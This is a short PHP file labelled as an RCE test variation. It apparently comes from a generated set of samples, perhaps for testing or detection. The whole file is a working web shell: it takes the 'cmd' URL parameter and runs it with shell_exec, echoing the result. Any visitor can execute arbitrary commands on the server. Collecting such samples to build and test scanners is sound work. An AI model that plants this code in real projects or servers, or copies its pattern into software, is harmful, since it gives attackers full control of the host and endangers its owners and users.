<?php
// RCE test variation #1229
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>